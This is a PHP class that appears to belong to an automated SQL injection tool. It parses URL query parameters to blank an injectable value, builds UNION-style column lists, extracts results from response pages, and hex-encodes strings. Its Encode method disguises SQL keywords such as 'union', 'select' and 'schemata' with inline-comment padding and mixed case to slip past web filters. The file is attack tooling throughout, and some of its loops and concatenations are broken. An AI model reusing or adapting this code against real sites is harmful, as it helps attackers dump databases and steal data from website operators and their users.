<?php
class chaine
{
	public function genParamParIndex($_param, $start = 0, $fin = -1)
    {
        $bind = '';
        for ($i = $start; $i < $fin; $i++)
        {
        	if(isset($_param[$i]))
        	{
	            if ($i == 0) 
	            	{ $bind .= $_param[$i]; }
	            else 
	            	{ $bind .= '&' + $_param[$i]; }
        	}
        }
        return $bind;
    }
    public function ViderDernierParam($param)
    {
        $bind = '';
        $_param = array();
        $Tparam = explode('?', $param);
        $Tparam = '?' . $Tparam[1];
        $pa = explode('&', $Tparam);
        $_param = $pa;
        for ($i = 0; $i < count($_param); $i++)
        {
            if ($i + 1 == count($_param))
            {
                $bind .= $this->escapeParam($_param[$i]);
            }
            else //(i == 0 && i != _param.Count)
            {
                $bind .= $_param[$i];
            }
        }
        return $bind;
    }
    public function analyseParam($url)
    {
        $_param = array();
        if (strpos($url, '?') !== false)
        {
        	$Tparam = explode('?', $url);
        	$Tparam = '?' . $Tparam[1];
            $param = explode('&', $Tparam);
            $_param = $param;
        }
        return $_param;
    }
    public function escapeParam($param)
    {
        return current(explode('=', $param)) . '=';
    }
    public function genNbrColonneVise($nbr_table, $index_var = -1)
    {
        $bind = '';
        for ($i = 1; $i <= $nbr_table + 1; $i++)
        {
            if ($i + 1 > $nbr_table + 1) 
            { 
                $bind .= $i; 
            }
            else if ($i == $index_var)
            {
                $bind .= '[t],';
            }
            else 
            { 
                $bind .= $i . ','; 
            }
        }
        return $bind;
    }
    public function extResult($separateur, $page)
    {
        $result = '';
        if(strpos($page, $separateur) !== false)
        {
            $result = explode($separateur, $page);
            return $result[1];
        }
        else
        {
            return '';
        }
    }
    public function extSubResult($s_separateur, $page)
    {
        $result = array();
        if (strpos($page, $s_separateur) !== false)
        {
            $result = explode($s_separateur, $page);
            return $result;
        }
        else
        {
            return $result;
        }
    }
    public function Encode($url)
    {
        $com = '%2f**%2f';
        $url = str_replace('select', $com . 'sElEcT',$url);
        $url = str_replace('from', $com . 'fRoM',$url);
        $url = str_replace('union', $com . 'uNiOn',$url);
        $url = str_replace('group_concat', $com . 'gRoUp_cOnCaT',$url);
        $url = str_replace('concat', $com . 'cOnCaT',$url);
        $url = str_replace('limit', $com . 'lImIt',$url);
        $url = str_replace('group by', $com . 'gRoUp' . $com . 'bY',$url);
        $url = str_replace('unhex', $com . 'uNhEx',$url);
        $url = str_replace('hex', $com . 'hEx',$url);
        $url = str_replace('schemata', $com . 'sChEmAtA',$url);
        $url = str_replace('table_name', $com . 'tAbLe_nAmE',$url);
        $url = str_replace('table_schema', $com . 'tAbLe_sChEmA',$url);
        $url = str_replace('tables', $com . 'tAbLeS',$url);
        $url = str_replace('column_name', $com . 'cOlUmN_NaMe',$url);
        $url = str_replace('columns', $com . 'cOlUmNs',$url);
        $url = str_replace('version', $com . 'vErSiOn',$url);
        $url = str_replace('distinct', $com . 'dIsTiNcT',$url);
        $url = str_replace('all', $com . 'aLl',$url);
        $url = str_replace('user', $com . 'uSeR',$url);
        $url = str_replace('database', $com . 'dAtAbAsE',$url);
        $url = str_replace('  ', ' ',$url);
        $url = str_replace(' ', '+',$url);
        return $url;
    }
    public function getHex($str)
    {
        $hex = '';
    	for ($i=0; $i<strlen($str); $i++)
    	{
	        $ord = ord($str[$i]);
	        $hexCode = dechex($ord);
	        $hex .= substr('0'.$hexCode, -2);
	    }
    	return '0x'.strtolower($hex);
    }
    public function getStringHex($hex)
    {
        $string='';
	    for ($i=0; $i < strlen($hex)-1; $i.=2){
	        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
	    }
	    return $string;
    }
}